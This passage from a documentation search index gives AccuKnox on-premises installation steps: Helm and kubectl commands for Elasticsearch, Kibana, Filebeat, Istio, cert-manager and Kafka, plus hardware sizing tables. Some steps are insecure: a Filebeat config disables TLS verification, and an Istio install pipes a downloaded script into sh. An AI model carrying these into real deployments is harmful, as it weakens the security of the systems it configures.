kubectl create ns accuknox-policy-provider-service Step 2 : helm upgrade --install accuknox-policy-provider-service accuknox-onprem-services/policy-provider-service -n accuknox-policy-provider-service","title":"Policy-provider-service"},{"location":"accuknox-onprem/core-components-install/#workload-identity-daemon","text":"Step 1 : kubectl create ns accuknox-workload-identity-daemon Step 2 : helm upgrade --install accuknox-workload-identity-daemon accuknox-onprem-services/workload-identity-daemon-chart -n accuknox-workload-identity-daemon","title":"Workload-identity-daemon"},{"location":"accuknox-onprem/core-components-install/#recommended-policy-daemon","text":"Step 1 : kubectl create ns accuknox-recommended-policy-daemon Step 2 : helm upgrade --install accuknox-recommended-policy-daemon accuknox-onprem-services/recommended-policy-daemon -n accuknox-recommended-policy-daemon","title":"Recommended-policy-daemon"},{"location":"accuknox-onprem/core-components-install/#discoveredpolicy-daemon","text":"Step 1 : kubectl create ns accuknox-discovered-policy-daemon Step 2 : helm upgrade --install accuknox-discovered-policy-daemon accuknox-onprem-services/discoveredpolicy-daemon-charts -n accuknox-discovered-policy-daemon","title":"Discoveredpolicy-daemon"},{"location":"accuknox-onprem/core-components-install/#label-service","text":"Step 1 : kubectl create ns accuknox-label-service Step 2 : helm upgrade --install accuknox-label-service accuknox-onprem-services/label-service-chart -n accuknox-label-service","title":"Label-service"},{"location":"accuknox-onprem/core-components-install/#knox-auto-policy","text":"Step 1 : kubectl create ns accuknox-knoxautopolicy Step 2 : helm upgrade --install accuknox-knoxautopolicy accuknox-onprem-services/knox-auto-policy-chart -n accuknox-knoxautopolicy","title":"Knox-auto-policy"},{"location":"accuknox-onprem/core-components-install/#kvm-service","text":"Step 1 : kubectl create ns accuknox-kvmservice Step 2 : helm upgrade --install accuknox-kvmservice accuknox-onprem-services/kvm-service-chart -n accuknox-kvmservice","title":"Kvm-service"},{"location":"accuknox-onprem/core-components-verify/","text":"","title":"Core components verify"},{"location":"accuknox-onprem/eck-install/","text":"Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install ECK helm package: \u00b6 helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/eck-operator --untar helm pull accuknox-onprem-logging/elasticsearch --untar helm pull accuknox-onprem-logging/filebeat --untar helm pull accuknox-onprem-logging/kibana --untar Kubectl create namespace accuknox-logging helm install eck-operator eck-operator -n accuknox-logging helm install elasticsearch elasticsearch -n accuknox-logging helm install filebeat filebeat -n accuknox-logging helm install kibana kibana -n accuknox-logging How to verify kubectl get all -n accuknox-logging You can see all the pods are up and running. Configuration of filebeat After the verification you have to get the password for kibana to login The default username is \u201celastic\u201d Command to get the password: kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n accuknox-logging It will give you a decoded secret name Once logged in with this username and password. Navigate to the Stack management->Index pattern->Create index pattern->filebeat-*->Next->choose timestamp","title":"Eck install"},{"location":"accuknox-onprem/eck-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/eck-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here..","title":"From the Binary Releases"},{"location":"accuknox-onprem/eck-install/#add-accuknox-repository-to-install-eck-helm-package","text":"helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/eck-operator --untar helm pull accuknox-onprem-logging/elasticsearch --untar helm pull accuknox-onprem-logging/filebeat --untar helm pull accuknox-onprem-logging/kibana --untar Kubectl create namespace accuknox-logging helm install eck-operator eck-operator -n accuknox-logging helm install elasticsearch elasticsearch -n accuknox-logging helm install filebeat filebeat -n accuknox-logging helm install kibana kibana -n accuknox-logging How to verify kubectl get all -n accuknox-logging You can see all the pods are up and running. Configuration of filebeat After the verification you have to get the password for kibana to login The default username is \u201celastic\u201d Command to get the password: kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n accuknox-logging It will give you a decoded secret name Once logged in with this username and password. Navigate to the Stack management->Index pattern->Create index pattern->filebeat-*->Next->choose timestamp","title":"Add accuknox repository to install ECK helm package:"},{"location":"accuknox-onprem/eck-purpose/","text":"Elastic Cloud on Kubernetes (ECK) extends the basic Kubernetes orchestration capabilities to support the setup and management of Elasticsearch, Kibana, Beats, on Kubernetes. With Elastic Cloud on Kubernetes we can streamline critical operations, such as: Managing and monitoring multiple clusters Scaling cluster capacity and storage Performing safe configuration changes through rolling upgrades Securing clusters with TLS certificates Setting up hot-warm-cold architectures with availability zone awareness Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - logging:true Labels - logging:true","title":"Eck purpose"},{"location":"accuknox-onprem/eck-verify/","text":"kubectl get all -n accuknox-logging You can see all the pods are up and running.","title":"Eck verify"},{"location":"accuknox-onprem/elastic-deploy/","text":"Elastic Operator Deployment \u00b6 1. Please create a namespace of your choice. Example : elastic-logging \u00b6 kubectl create ns elastic-logging Note: Please use feeder-service namespace , if required. 2. Clone the git repository \u00b6 git clone -b dev https://github.com/accuknox/Accuknox-Logging Navigate into the directory that holds eck-operator folder. 3. Helm Install (Elastic) \u00b6 Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. helm repo add elastic https://helm.elastic.co helm install elastic-operator eck-operator -n <namespace> Please enable the elastic resource as true in values.yaml to install Kibana along with feeder. elasticsearch : enabled : true Note: If there is ELK set up already running on the cluster, the CRD apply may fail. 4. Helm Install (Kibana) \u00b6 Please enable the Kibana resource as true in values.yaml to install Kibana along with feeder. kibana : enabled : true Navigate into the directory that holds kibana folder. 5. Beats Setup \u00b6 The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . a. Elastic Configuration Parameters: \u00b6 We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace b. Updating Elastic Search Host (Runtime): \u00b6 kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d c. Update Log Path: \u00b6 To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log 6. Kibana Dashboard \u00b6 Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them. 7. Successful Installation \u00b6 kubectl get all -n <namespace> kubectl port-forward svc/kibana-kb-http 5601 :5601 All the pods should be up and running. Kibana Ui with filebeat index should be seen (after beat installation).","title":"Elastic deploy"},{"location":"accuknox-onprem/elastic-deploy/#elastic-operator-deployment","text":"","title":"Elastic Operator Deployment"},{"location":"accuknox-onprem/elastic-deploy/#1-please-create-a-namespace-of-your-choice-example-elastic-logging","text":"kubectl create ns elastic-logging Note: Please use feeder-service namespace , if required.","title":"1. Please create a namespace of your choice. Example : elastic-logging"},{"location":"accuknox-onprem/elastic-deploy/#2-clone-the-git-repository","text":"git clone -b dev https://github.com/accuknox/Accuknox-Logging Navigate into the directory that holds eck-operator folder.","title":"2. Clone the git repository"},{"location":"accuknox-onprem/elastic-deploy/#3-helm-install-elastic","text":"Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. helm repo add elastic https://helm.elastic.co helm install elastic-operator eck-operator -n <namespace> Please enable the elastic resource as true in values.yaml to install Kibana along with feeder. elasticsearch : enabled : true Note: If there is ELK set up already running on the cluster, the CRD apply may fail.","title":"3. Helm Install (Elastic)"},{"location":"accuknox-onprem/elastic-deploy/#4-helm-install-kibana","text":"Please enable the Kibana resource as true in values.yaml to install Kibana along with feeder. kibana : enabled : true Navigate into the directory that holds kibana folder.","title":"4. Helm Install (Kibana)"},{"location":"accuknox-onprem/elastic-deploy/#5-beats-setup","text":"The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana .","title":"5. Beats Setup"},{"location":"accuknox-onprem/elastic-deploy/#a-elastic-configuration-parameters","text":"We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace","title":"a. Elastic Configuration Parameters:"},{"location":"accuknox-onprem/elastic-deploy/#b-updating-elastic-search-host-runtime","text":"kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d","title":"b. Updating Elastic Search Host (Runtime):"},{"location":"accuknox-onprem/elastic-deploy/#c-update-log-path","text":"To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log","title":"c. Update Log Path:"},{"location":"accuknox-onprem/elastic-deploy/#6-kibana-dashboard","text":"Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.","title":"6. Kibana Dashboard"},{"location":"accuknox-onprem/elastic-deploy/#7-successful-installation","text":"kubectl get all -n <namespace> kubectl port-forward svc/kibana-kb-http 5601 :5601 All the pods should be up and running. Kibana Ui with filebeat index should be seen (after beat installation).","title":"7. Successful Installation"},{"location":"accuknox-onprem/elastic/","text":"On Prem Elastic \u00b6 The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent. Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. 1. Status of Elastic with On prem Feeder: \u00b6 Please run the below command to check if agent and dependent pods are up and running. kubectl get all -n <namespace> All the pods/services should be in Running state. 2. Status of Beats with On prem Feeder: \u00b6 Once the feeder agent starts running, exec into the filebeat sidecar as below. Kubectl exec -it <podname> -c filebeat-sidecar -n <namespace> filebeat -e -d \"*\" 3. Metrics: \u00b6 Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f <podname> \u2013n <namespace>","title":"Elastic"},{"location":"accuknox-onprem/elastic/#on-prem-elastic","text":"The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent. Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.","title":"On Prem Elastic"},{"location":"accuknox-onprem/elastic/#1-status-of-elastic-with-on-prem-feeder","text":"Please run the below command to check if agent and dependent pods are up and running. kubectl get all -n <namespace> All the pods/services should be in Running state.","title":"1. Status of Elastic with On prem Feeder:"},{"location":"accuknox-onprem/elastic/#2-status-of-beats-with-on-prem-feeder","text":"Once the feeder agent starts running, exec into the filebeat sidecar as below. Kubectl exec -it <podname> -c filebeat-sidecar -n <namespace> filebeat -e -d \"*\"","title":"2. Status of Beats with On prem Feeder:"},{"location":"accuknox-onprem/elastic/#3-metrics","text":"Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f <podname> \u2013n <namespace>","title":"3. Metrics:"},{"location":"accuknox-onprem/hw-req-agent/","text":"AccuKnox Agents Resource Requirement \u00b6 Component Name Agents Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 4 Memory Per Node 4 Disk Size Per Node 50 Total CPU 12 Total Memory 12 Total Disk Size 150","title":"Hw req agent"},{"location":"accuknox-onprem/hw-req-agent/#accuknox-agents-resource-requirement","text":"Component Name Agents Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 4 Memory Per Node 4 Disk Size Per Node 50 Total CPU 12 Total Memory 12 Total Disk Size 150","title":"AccuKnox Agents Resource Requirement"},{"location":"accuknox-onprem/hw-req-core-components/","text":"Core Components Resource Requirement \u00b6 Component Name Core Components No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 12 Memory Per Node 24 Disk Size Per Node 50 Total CPU 36 Total Memory 72 Total Disk Size 150 Taints & Lables - Node Pool Name microservices","title":"Hw req core components"},{"location":"accuknox-onprem/hw-req-core-components/#core-components-resource-requirement","text":"Component Name Core Components No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 12 Memory Per Node 24 Disk Size Per Node 50 Total CPU 36 Total Memory 72 Total Disk Size 150 Taints & Lables - Node Pool Name microservices","title":"Core Components Resource Requirement"},{"location":"accuknox-onprem/hw-req-logging/","text":"Logging Resource Requirement \u00b6 Component Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables logging:true Node Pool Name logging","title":"Hw req logging"},{"location":"accuknox-onprem/hw-req-logging/#logging-resource-requirement","text":"Component Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables logging:true Node Pool Name logging","title":"Logging Resource Requirement"},{"location":"accuknox-onprem/hw-req-pre-requisites/","text":"Istio Resource Requirements \u00b6 Component Name Istio No of Nodes 2 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 2 Memory Per Node 4 Disk Size Per Node 50 Total CPU 6 Total Memory 12 Total Disk Size 150 MySQL Resource Requirement \u00b6 Component Name MySQL No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 16 Memory Per Node 20 Disk Size Per Node 50 Total CPU 48 Total Memory 60 Total Disk Size 150 Taints & Lables mysql:true Node Pool Name db-mysql Kafka Resource Requirement \u00b6 Component Name Kafka No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables kafka:true Node Pool Name db-kafka Pinot Resource Requirement \u00b6 Component Name Pinot No of Nodes 6 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 20 Disk Size Per Node 50 Total CPU 36 Total Memory 120 Total Disk Size 300 Taints & Lables pinot:true Node Pool Name db-pinot","title":"Hw req pre requisites"},{"location":"accuknox-onprem/hw-req-pre-requisites/#istio-resource-requirements","text":"Component Name Istio No of Nodes 2 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 2 Memory Per Node 4 Disk Size Per Node 50 Total CPU 6 Total Memory 12 Total Disk Size 150","title":"Istio Resource Requirements"},{"location":"accuknox-onprem/hw-req-pre-requisites/#mysql-resource-requirement","text":"Component Name MySQL No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 16 Memory Per Node 20 Disk Size Per Node 50 Total CPU 48 Total Memory 60 Total Disk Size 150 Taints & Lables mysql:true Node Pool Name db-mysql","title":"MySQL Resource Requirement"},{"location":"accuknox-onprem/hw-req-pre-requisites/#kafka-resource-requirement","text":"Component Name Kafka No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables kafka:true Node Pool Name db-kafka","title":"Kafka Resource Requirement"},{"location":"accuknox-onprem/hw-req-pre-requisites/#pinot-resource-requirement","text":"Component Name Pinot No of Nodes 6 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 20 Disk Size Per Node 50 Total CPU 36 Total Memory 120 Total Disk Size 300 Taints & Lables pinot:true Node Pool Name db-pinot","title":"Pinot Resource Requirement"},{"location":"accuknox-onprem/hw-req-prom-graf/","text":"Monitoring Resource Requirement \u00b6 Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints & Lables monitoring:true Node Pool Name monitoring","title":"Hw req prom graf"},{"location":"accuknox-onprem/hw-req-prom-graf/#monitoring-resource-requirement","text":"Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints & Lables monitoring:true Node Pool Name monitoring","title":"Monitoring Resource Requirement"},{"location":"accuknox-onprem/istio-install/","text":"Istio Installion steps: \u00b6 Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS): curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3: cd istio-1.10.0 Create a namespace istio-system for Istio components: kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane: helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service: helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components: helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system Verifying the installation: \u00b6 Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running: kubectl get pods -n istio-system Installing Gateway \u00b6 Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy proxies running at the edge of the mesh, providing fine-grained control over traffic entering and leaving the mesh. Add accuknox repositories to install istio helm package: \u00b6 helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar Move to directory cd istio-gateway-charts Cert Manager \u00b6 Install cert-manager. Cert-manager will manage the certificates of gateway domains. Setup permissions \u00b6 When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account ) Install Cert-manager \u00b6 kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml Platform-istio-gateway \u00b6 Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the micro services under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager Create Gateway \u00b6 Find the Gateway IP INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) This will give you a LoadBalancer IP echo ${ INGRESS_HOST } Create DNS \u00b6 Create A record for example (sample.example.com and keycloak.example.com) using LoadBalancer IP # Create a certificate Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honoring certificate signing requests. kubectl apply -f issuer.yaml kubectl get ClusterIssuer -n cert-manager # Should have Status as Ready A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determine what will be honoring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready # Create gateway with SSL kubectl apply -f gateway-with-ssl.yaml ` [ No need to specify namespace ] # Apply Virtual Service A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml [No need to specify namespace] kubectl apply -f keycloak/virtual-service.yaml","title":"Istio install"},{"location":"accuknox-onprem/istio-install/#istio-installion-steps","text":"Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS): curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3: cd istio-1.10.0 Create a namespace istio-system for Istio components: kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane: helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service: helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components: helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system","title":"Istio Installion steps:"},{"location":"accuknox-onprem/istio-install/#verifying-the-installation","text":"Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running: kubectl get pods -n istio-system","title":"Verifying the installation:"},{"location":"accuknox-onprem/istio-install/#installing-gateway","text":"Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy proxies running at the edge of the mesh, providing fine-grained control over traffic entering and leaving the mesh.","title":"Installing Gateway"},{"location":"accuknox-onprem/istio-install/#add-accuknox-repositories-to-install-istio-helm-package","text":"helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar Move to directory cd istio-gateway-charts","title":"Add accuknox repositories to install istio helm package:"},{"location":"accuknox-onprem/istio-install/#cert-manager","text":"Install cert-manager. Cert-manager will manage the certificates of gateway domains.","title":"Cert Manager"},{"location":"accuknox-onprem/istio-install/#setup-permissions","text":"When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account )","title":"Setup permissions"},{"location":"accuknox-onprem/istio-install/#install-cert-manager","text":"kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml","title":"Install Cert-manager"},{"location":"accuknox-onprem/istio-install/#platform-istio-gateway","text":"Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the micro services under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager","title":"Platform-istio-gateway"},{"location":"accuknox-onprem/istio-install/#create-gateway","text":"Find the Gateway IP INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) This will give you a LoadBalancer IP echo ${ INGRESS_HOST }","title":"Create Gateway"},{"location":"accuknox-onprem/istio-install/#create-dns","text":"Create A record for example (sample.example.com and keycloak.example.com) using LoadBalancer IP # Create a certificate Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honoring certificate signing requests. kubectl apply -f issuer.yaml kubectl get ClusterIssuer -n cert-manager # Should have Status as Ready A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determine what will be honoring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready # Create gateway with SSL kubectl apply -f gateway-with-ssl.yaml ` [ No need to specify namespace ] # Apply Virtual Service A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml [No need to specify namespace] kubectl apply -f keycloak/virtual-service.yaml","title":"Create DNS"},{"location":"accuknox-onprem/istio-purpose/","text":"Istio is an open source service mesh that layers transparently onto existing distributed applications. Istio\u2019s powerful features provide a uniform and more efficient way to secure, connect, and monitor services. Istio is the path to load balancing, service-to-service authentication, and monitoring \u2013 with few or no service code changes. Its powerful control plane brings vital features, including: Secure service-to-service communication in a cluster with TLS encryption, strong identity based authentication and authorization Automatic load balancing for HTTP, gRPC, WebSocket, and TCP traffic Fine-grained control of traffic behavior with rich routing rules, retries, failovers, and fault injection A pluggable policy layer and configuration API supporting access controls, rate limits and quotas Automatic metrics, logs, and traces for all traffic within a cluster, including cluster ingress and egress For more reference: click here..","title":"Istio purpose"},{"location":"accuknox-onprem/istio-verify/","text":"To verify \u00b6 kubectl get po -n istio-system","title":"Istio verify"},{"location":"accuknox-onprem/istio-verify/#to-verify","text":"kubectl get po -n istio-system","title":"To verify"},{"location":"accuknox-onprem/kafka-install/","text":"Note: \u00b6 Kafka Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - kafka:true Labels - kafka:true Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install strimzi-kafka-operator helm package: helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar kubectl create namespace accuknox-kafka helm install accuknox-kafka strimzi-kafka-operator -n accuknox-kafka Check the Pods deployment kubectl get pods -n accuknox-kafka Extract the connectivity information. Get bootstrap server endpoint \u00b6 kubectl get kafka accuknox-kafka -o jsonpath = '{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka Get CA \u00b6 kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath = '{.data.ca\\.p12}' -n accuknox-kafka | base64 -d > ca.p12 Note: For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster.. Get CA Password \u00b6 kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath 